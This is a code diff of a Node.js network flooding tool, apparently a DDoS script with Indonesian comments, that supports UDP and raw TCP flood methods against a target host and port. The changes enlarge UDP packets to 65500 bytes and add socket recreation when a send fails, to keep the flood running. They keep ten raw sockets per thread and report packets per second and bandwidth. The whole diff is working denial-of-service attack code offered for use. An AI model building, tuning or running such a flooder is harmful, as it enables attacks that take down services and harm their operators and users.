@@ -14,18 +14,32 @@ const hostname = os.hostname();
 let sent = 0;
 let start = Date.now();
 
-// ========== UDP GACOR ==========
+// ========== UDP MAKSIMAL ==========
 if (method === 'udp') {
-    const payload = crypto.randomBytes(1400);
+    // PAKAI PAYLOAD MAKSIMAL 65500 BYTES
+    const payload = crypto.randomBytes(65500);
     
+    // SET SOCKET OPTIONS BIAR LEBIH CEPET
     for(let i = 0; i < threads; i++) {
         const sock = dgram.createSocket('udp4');
         sock.on('error', () => {});
         
+        // GA USAH BIND BIAR OS YANG MILIHIN PORT (CEPET)
+        
         const send = () => {
-            sock.send(payload, port, target, () => {
-                sent++;
-                setImmediate(send);
+            sock.send(payload, port, target, (err) => {
+                if (!err) {
+                    sent++;
+                    setImmediate(send);
+                } else {
+                    // KALO ERROR, BUAT SOCKET BARU
+                    sock.close();
+                    setTimeout(() => {
+                        const newSock = dgram.createSocket('udp4');
+                        newSock.on('error', () => {});
+                        send();
+                    }, 1);
+                }
             });
         };
         send();
@@ -34,13 +48,13 @@ if (method === 'udp') {
     setTimeout(() => {
         const elapsed = (Date.now() - start) / 1000;
         const pps = sent / elapsed;
-        const mbps = (sent * 1400 * 8) / elapsed / 1024 / 1024;
+        const mbps = (sent * 65500 * 8) / elapsed / 1024 / 1024;
         console.log(`✅ UDP | ${sent.toLocaleString()} pkts | ${pps.toFixed(0)} PPS | ${mbps.toFixed(2)} Mbps`);
         process.exit(0);
     }, duration * 1000);
 }
 
-// ========== TCP-RAW ULTRA GACOR ==========
+// ========== TCP-RAW ULTRA ==========
 else if (method === 'tcp-raw') {
     let raw;
     try { raw = require('raw-socket'); } catch(e) { 
@@ -113,11 +127,9 @@ else if (method === 'tcp-raw') {
         return Buffer.concat([ip, tcp]);
     }
     
-    // SUPER AGGRESSIVE: 10 socket per thread
+    // 10 SOCKET PER THREAD
     const socketsPerThread = 10;
     const totalSockets = threads * socketsPerThread;
-    
-    console.log(`🔥 TCP-RAW | ${threads} threads x ${socketsPerThread} sockets = ${totalSockets} sockets`);
     
     for(let i = 0; i < threads; i++) {
         for(let s = 0; s < socketsPerThread; s++) {
